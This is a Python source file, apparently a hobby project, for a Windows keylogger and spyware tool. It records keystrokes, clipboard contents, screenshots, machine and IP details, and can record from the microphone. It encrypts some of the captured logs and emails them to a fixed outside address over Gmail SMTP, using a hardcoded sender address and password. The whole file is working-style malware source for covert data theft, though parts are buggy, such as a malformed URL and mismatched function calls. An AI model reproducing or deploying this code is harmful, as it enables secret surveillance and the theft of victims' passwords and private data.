from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import smtplib

import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from PIL import ImageGrab      #to take screenshots
key_information = "key_log.txt"
system_information= "sysmtinfo.txt"
clipboard_information = "CopyClipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
key_informations_e =  "e_key_log.txt"
system_information_e = "e_sysmtinfo.txt"
clipboard_information_e = "e_CopyClipboard.txt"
microphone_time = 60
time_run = 20
number_of_times_to_run_end = 5
email_address = "testkeyloger@gmail.com"
password = "TEST@Keyloger@0912"
username = getpass.getuser()
toaddr = "test2keyloger@gmail.com"
key = "LTU6w8mVsjixa8letgt1-dzwGSv5GXdFvNl_45QtnGI="
file_path = "C:\\Users\\Ravi\\Desktop\\Projects\\Python_Projects"
extend = "\\"
file_merge = file_path + extend
def send_email(filename, attachment, toaddr, m):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File From the System"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body , 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    part = MIMEBase('application' , 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',"attachment; filename= %s" % filename)
    msg.attach(part)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

#send_email(key_information, file_path + extend + key_information, toaddr)
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try :
            public_ip = get("hhtps:api.ipify.org").text
            f.write("Public IP Address : " + public_ip)
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")
        f.write("Machine: " +platform.machine() + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")
#computer_information()
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as c:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            c.write("Clipboard Data: \n " + pasted_data)
        except:
            c.write("Clipboard could be not be copied")
#copy_clipboard()
def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds*fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording)

#microphone()

def screenshot():
    image = ImageGrab.grab()
    image.save(file_path + extend + screenshot_information)
#screenshot()
number_of_times_to_run = 0
currentTime = time.time()
stopingTime = time.time() + time_run
while number_of_times_to_run < number_of_times_to_run_end:

    count = 0
    keys = []
    def on_press(key):
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()
    def wirte_file(keys):
        pass
    if  count >= 1:
        count = 0
    wirte_file(keys)
    keys =[]
    def write_file_to(keys):
        with open(file_path + extend + key_information , "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") >0:
                    f.write("\n")
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()
    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stopingTime:
            return False
    with Listener(on_press=on_press, on_release = on_release) as listener:
        listener.join()
    if currentTime > stopingTime:
        with open(file_path + extend + key_information, "w") as f:
            f.write(" ")
        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
        copy_clipboard ()
    number_of_times_to_run += 1
    currentTime = time.time()
    stopingTime = time.time() + time_run


#encipotion
files_to_encrypt = [file_merge + system_information, file_merge + key_information, file_merge + clipboard_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + key_informations_e, file_merge + clipboard_information_e]
count = 0
for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)
    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1
time.sleep(100)

